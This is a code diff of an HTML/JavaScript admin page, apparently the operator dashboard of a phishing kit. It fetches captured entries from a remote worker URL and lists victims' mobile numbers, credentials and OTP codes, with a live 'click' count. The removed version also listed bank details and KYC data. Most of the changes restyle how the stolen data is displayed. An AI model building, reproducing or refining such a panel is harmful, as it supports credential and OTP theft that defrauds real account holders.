@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - Live Tracking</title>
+    <title>Admin - Clean Panel</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
-        body { background-color: #fff; text-align: center; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f4f4f9; text-align: center; }
 
         header { 
             padding: 15px 20px; 
-            border-bottom: 1px solid #eee; 
             display: flex; 
             justify-content: space-between; 
             align-items: center;
@@ -19,48 +18,51 @@
             top: 0;
             background: #fff;
             z-index: 100;
+            border-bottom: 1px solid #eee;
         }
 
-        .header-center { flex-grow: 1; text-align: center; padding-left: 60px; }
+        .header-center { flex-grow: 1; text-align: center; }
         h1 { font-size: 20px; font-weight: bold; color: #000; letter-spacing: 2px; }
-        .sub-text { color: red; font-size: 9px; font-weight: bold; margin-top: 2px; }
+        .sub-text { color: red; font-size: 10px; font-weight: bold; margin-top: 2px; }
 
-        /* Updated: White Background for Click Count */
+        /* Transparent Count Style */
         #click-count {
             font-family: 'Orbitron', sans-serif;
-            font-size: 24px;
-            color: #00FF00; /* Digital Green */
+            font-size: 26px;
+            color: #000;
+            background: transparent;
             font-weight: bold;
-            background: #fff; /* White Background */
-            padding: 5px 10px;
-            border: 0px solid #eee; /* Halka border taaki white par white mix na ho */
-            border-radius: 0px;
-            min-width: 0px;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.1); /* Halka shadow taaki green uth kar dikhe */
         }
 
-        #data-container { padding: 10px; max-width: 500px; margin: 0 auto; }
+        #data-container { padding: 20px 10px; max-width: 500px; margin: 0 auto; }
 
+        /* No Border Card Style */
         .card {
             text-align: left;
-            padding: 15px 5px;
-            border-bottom: 1.5px solid #000; /* Solid Black Line */
-            margin-bottom: 5px;
+            padding: 20px;
+            background: #ffffff;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            /* Border hatakar shadow lagayi hai card feel ke liye */
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08); 
+            border: none; 
         }
 
         .data-text {
-            font-size: 14px;
-            color: #333;
+            font-size: 15px;
+            color: #000;
             line-height: 1.6;
             white-space: pre-wrap;
             word-wrap: break-word;
         }
 
-        .time-stamp {
-            font-size: 10px;
-            color: #888;
-            margin-top: 5px;
+        .label-style { 
+            color: #777; 
+            font-size: 11px; 
+            font-weight: bold; 
+            text-transform: uppercase; 
             display: block;
+            margin-bottom: 2px;
         }
     </style>
 </head>
@@ -68,8 +70,8 @@
 
     <header>
         <div class="header-center">
-            <h1>DATA</h1>
-            <div class="sub-text">Show data here</div>
+            <h1>LIVE</h1>
+            <div class="sub-text">Show Data here </div>
         </div>
         <div id="click-count">00</div>
     </header>
@@ -84,7 +86,6 @@
                 const response = await fetch(workerURL);
                 const data = await response.json();
                 
-                // Update Click Count
                 const countElement = document.getElementById('click-count');
                 countElement.innerText = data.length < 10 ? "0" + data.length : data.length;
 
@@ -92,26 +93,22 @@
                 container.innerHTML = ''; 
 
                 data.forEach(entry => {
-                    const card = document.createElement('div');
-                    card.className = 'card';
-
                     let content = "";
-                    if (entry.mobile) content += `Mobile: ${entry.mobile}\n`;
-                    if (entry.credentials) content += `${entry.credentials}\n`;
-                    if (entry.bank_details) content += `${entry.bank_details}\n`;
-                    if (entry.kyc_data) content += `${entry.kyc_data}\n`;
-                    if (entry.otp_1) content += `OTP 1: ${entry.otp_1}\n`;
-                    if (entry.otp_2) content += `OTP 2: ${entry.otp_2}\n`;
-                    if (entry.otp_3) content += `OTP 3: ${entry.otp_3}`;
+                    if (entry.mobile) content += `<span class="label-style">Mobile</span>${entry.mobile}\n\n`;
+                    if (entry.credentials) content += `<span class="label-style">Credentials</span>${entry.credentials}\n\n`;
+                    if (entry.otp_1) content += `<span class="label-style">OTP 1</span>${entry.otp_1}\n`;
+                    if (entry.otp_2) content += `<span class="label-style">OTP 2</span>${entry.otp_2}\n`;
+                    if (entry.otp_3) content += `<span class="label-style">OTP 3</span>${entry.otp_3}`;
 
-                    card.innerHTML = `
-                        <div class="data-text">${content}</div>
-                        <span class="time-stamp">${entry.time}</span>
-                    `;
-                    container.appendChild(card);
+                    if (content.trim() !== "") {
+                        const card = document.createElement('div');
+                        card.className = 'card';
+                        card.innerHTML = `<div class="data-text">${content}</div>`;
+                        container.appendChild(card);
+                    }
                 });
             } catch (err) {
-                console.error("Error fetching data:", err);
+                console.error("Worker Error:", err);
             }
         }
 
